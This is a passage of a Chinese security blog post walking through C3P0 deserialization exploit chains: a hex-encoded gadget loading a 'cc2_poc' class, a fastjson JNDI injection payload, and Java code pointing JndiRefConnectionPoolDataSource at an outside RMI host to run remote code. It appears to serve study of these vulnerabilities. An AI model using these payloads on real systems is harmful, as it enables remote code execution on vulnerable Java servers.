+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1687671304545-df15719f-dc6a-43b2-bd45-29b61957eaa2.png#averageHue=%23334251&clientId=u720e7f3a-7e1b-4&from=paste&height=178&id=uea71c7ae&originHeight=178&originWidth=1506&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=106505&status=done&style=none&taskId=u2bca3072-1bcd-484b-9fd1-76edd43ae2b&title=&width=1506" alt="image.png"><br>触发点<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1687671348032-cc702502-69f9-4011-b257-02a111eae7ec.png#averageHue=%23333940&clientId=u720e7f3a-7e1b-4&from=paste&height=225&id=u1ce6ca51&originHeight=225&originWidth=1556&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=148464&status=done&style=none&taskId=u15f70749-0f13-4467-8b93-170cfb6624b&title=&width=1556" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1687671357645-78c41dbe-bb1f-4fb7-924c-b3c7398c0629.png#averageHue=%23313538&clientId=u720e7f3a-7e1b-4&from=paste&height=297&id=u8da14e82&originHeight=297&originWidth=1338&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=139898&status=done&style=none&taskId=u6501ce52-b4db-4d94-9f6a-ae6f986f3d8&title=&width=1338" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1687671370432-9ff43eb4-2643-45e3-977f-55b8ca825c1d.png#averageHue=%233c3f3f&clientId=u720e7f3a-7e1b-4&from=paste&height=1026&id=u5ab821fb&originHeight=1026&originWidth=1881&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=740121&status=done&style=none&taskId=uc4ec0d28-50d3-4d36-b17d-efd90f152ec&title=&width=1881" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1687671380420-8c3f6d11-fe46-4c06-92fe-629285209454.png#averageHue=%23303537&clientId=u720e7f3a-7e1b-4&from=paste&height=863&id=uacd415fe&originHeight=863&originWidth=1963&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=560128&status=done&style=none&taskId=uf7aeee1b-ce01-47f5-8aff-730f4ce11a5&title=&width=1963" alt="image.png"><br>进入关键点，调用了C3P0ImplUtils.parseUserOverridesAsString<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1687671404740-67415b9f-7ace-4bfb-974e-6a43ae81cd49.png#averageHue=%23323a42&clientId=u720e7f3a-7e1b-4&from=paste&height=462&id=u2fdc0d83&originHeight=462&originWidth=1766&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=293712&status=done&style=none&taskId=uc93c7bc2-f826-4ee7-b54f-0d01a45b135&title=&width=1766" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1687671424594-c66f1a4c-e489-406e-9489-0f95d84c1a32.png#averageHue=%23323536&clientId=u720e7f3a-7e1b-4&from=paste&height=106&id=uaf26f1fb&originHeight=106&originWidth=1145&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=40716&status=done&style=none&taskId=uc59d860f-0389-4536-be2c-f5a7bf2189e&title=&width=1145" alt="image.png"><br>对bytes进行了截取，获得了完整的类字节码的16进制，再通过fromHexAscii转换成bytes<br>进入SerializableUtils.fromByteArray( serBytes )<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1687671921845-44d35391-7770-449a-83a2-79570ba71db3.png#averageHue=%2332404e&clientId=u720e7f3a-7e1b-4&from=paste&height=207&id=u6c3da9b6&originHeight=207&originWidth=1668&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=135046&status=done&style=none&taskId=u709b7dca-ff6a-4b13-81f7-a7da3eeac34&title=&width=1668" alt="image.png"><br>在进入deserializeFromByteArray<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1687671949408-9b88f8b1-5b23-4a82-a55e-ec4bb463d5ec.png#averageHue=%23313d49&clientId=u720e7f3a-7e1b-4&from=paste&height=267&id=uf38b2b43&originHeight=267&originWidth=1623&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=158657&status=done&style=none&taskId=u82c69d02-76ad-4baf-8783-31b98de06de&title=&width=1623" alt="image.png">通过读取字节码加载了cc2_poc，最终执行cc2的readObject，<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1687671993390-53aeb11b-3b76-4448-8bca-7fbf611fd99c.png#averageHue=%23464b44&clientId=u720e7f3a-7e1b-4&from=paste&height=1258&id=u1c6a39b2&originHeight=1258&originWidth=1354&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=384447&status=done&style=none&taskId=u2bca505f-34a0-4607-a247-95fd0247ad7&title=&width=1354" alt="image.png"></p>
+<h3 id="c3p0-fastjson-打JNDI"><a href="#c3p0-fastjson-打JNDI" class="headerlink" title="c3p0 fastjson 打JNDI"></a>c3p0 fastjson 打JNDI</h3><pre class="line-numbers language-none"><code class="language-none">fastjson exp:
+String poc &#x3D; &quot;&#123;\&quot;object\&quot;:[\&quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource\&quot;,&#123;\&quot;jndiName\&quot;:\&quot;rmi:&#x2F;&#x2F;localhost:8088&#x2F;Exploit\&quot;, \&quot;loginTimeout\&quot;:0&#125;]&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>支持jdku191以下</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cp30</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>mchange<span class="token punctuation">.</span>v2<span class="token punctuation">.</span>c3p0<span class="token punctuation">.</span></span><span class="token class-name">JndiRefConnectionPoolDataSource</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>beans<span class="token punctuation">.</span></span><span class="token class-name">PropertyVetoException</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">SQLException</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> c3p0_jndi <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">PropertyVetoException</span><span class="token punctuation">,</span> <span class="token class-name">SQLException</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">JndiRefConnectionPoolDataSource</span> exp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JndiRefConnectionPoolDataSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        exp<span class="token punctuation">.</span><span class="token function">setJndiName</span><span class="token punctuation">(</span><span class="token string">"rmi://192.168.1.13:1099/dvli1n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        exp<span class="token punctuation">.</span><span class="token function">setLoginTimeout</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>通过setJndiName设置jndiName<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1687679564490-bec7ca30-16ab-4394-b339-0da03bac67e4.png#averageHue=%23323739&clientId=u86621d6a-275e-4&from=paste&height=374&id=ub74b4d1f&originHeight=374&originWidth=1794&originalType=binary&ratio=1&rotation=0&showTitle=false&size=251461&status=done&style=none&taskId=ud2845382-2525-4482-b477-8b1fac95180&title=&width=1794" alt="image.png"><br>进入setLoginTimeout<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1687679583081-bdb48e02-a98b-4c79-9291-18a3e77a1c0c.png#averageHue=%23353a3c&clientId=u86621d6a-275e-4&from=paste&height=172&id=ua92c66a9&originHeight=172&originWidth=1009&originalType=binary&ratio=1&rotation=0&showTitle=false&size=69596&status=done&style=none&taskId=uad1d15e1-8e53-4729-9f25-2ae541e8148&title=&width=1009" alt="image.png"><br>一直向下跟进setLoginTimeout<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1687679612867-a3540c52-b7d8-4993-96d4-a3f6c566deef.png#averageHue=%23324355&clientId=u86621d6a-275e-4&from=paste&height=153&id=u236ccf5a&originHeight=153&originWidth=1146&originalType=binary&ratio=1&rotation=0&showTitle=false&size=67784&status=done&style=none&taskId=u827bf687-8916-4c64-8203-9a494a87b56&title=&width=1146" alt="image.png">进入inner<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1687679648672-d1694593-3f52-4071-b39d-457504c88853.png#averageHue=%23363b3d&clientId=u86621d6a-275e-4&from=paste&height=415&id=u0243a45c&originHeight=415&originWidth=1194&originalType=binary&ratio=1&rotation=0&showTitle=false&size=158253&status=done&style=none&taskId=u15a44fc5-e99a-4be0-9a4f-431b2e37660&title=&width=1194" alt="image.png"><br>进入dereference函数<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1687679667569-2e488a1a-1d4e-4d7b-b4ed-a9fa167c8656.png#averageHue=%23323638&clientId=u86621d6a-275e-4&from=paste&height=647&id=u5c494058&originHeight=647&originWidth=1423&originalType=binary&ratio=1&rotation=0&showTitle=false&size=309425&status=done&style=none&taskId=u943b31dc-fd70-4133-9001-2bf404fb9cf&title=&width=1423" alt="image.png"><br>获取当前的JndiName，就是刚刚设置的<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1687679689741-87ef8066-17f0-44dd-8f25-5d03a497a112.png#averageHue=%23313537&clientId=u86621d6a-275e-4&from=paste&height=547&id=u19403d2a&originHeight=547&originWidth=1741&originalType=binary&ratio=1&rotation=0&showTitle=false&size=331935&status=done&style=none&taskId=u2e975848-df4c-4f04-89a6-2dd2eef642f&title=&width=1741" alt="image.png">满足是String的条件，用lookup调用，触发JNDI注入，计算机弹出来了！！！</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2023/07/08/thinkphp%E7%9A%84%E4%B8%80%E4%BA%9B%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2023-07-08 17:24:14
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#URLClassLoader"><span class="toc-text">URLClassLoader</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%99%E9%87%8C%E5%85%88%E8%AE%B2%E4%B8%80%E4%B8%8BwriteObject"><span class="toc-text">这里先讲一下writeObject</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">反序列化</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hex-base-%E4%B8%80%E8%88%AC%E7%94%A8%E4%BA%8Efastjson"><span class="toc-text">Hex_base  一般用于fastjson</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#c3p0-fastjson-%E6%89%93JNDI"><span class="toc-text">c3p0 fastjson 打JNDI</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+  
+    <script async type="text/javascript" src='https://cdn.jsdelivr.net/npm/valine@1.4.18/dist/Valine.min.js' onload="loadValineSuc(this)"></script>
+  
+
+  <div id="vcomments"></div>
+
+  <script>
+    function loadValineSuc() {
+      new Valine({
+        el: '#vcomments',
+        appId: 'bNa2jesvrDl0f51DIPiFWHCO-gzGzoHsz',
+        appKey: 'UfLQ40Ou8xWfDtBEct4Yxct1',
+        placeholder: 'welcome!',
+        avatar: 'retro',
+        lang: 'en'
+      })
+    }
+  </script>
+
+    <style>
+      .comments-container .v .vempty {
+        display: none!important;
+      }
+    </style>
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2023 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + C3P0%E8%A7%A3%E6%9E%90%E4%B8%8E%E7%94%A8%E6%B3%95 + '&url=' + http%3A%2F%2Fexample.com%2F2023%2F07%2F08%2FC3P0%25E8%25A7%25A3%25E6%259E%2590%25E4%25B8%258E%25E7%2594%25A8%25E6%25B3%2595%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2023/07/08/C3P0%E8%A7%A3%E6%9E%90%E4%B8%8E%E7%94%A8%E6%B3%95/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
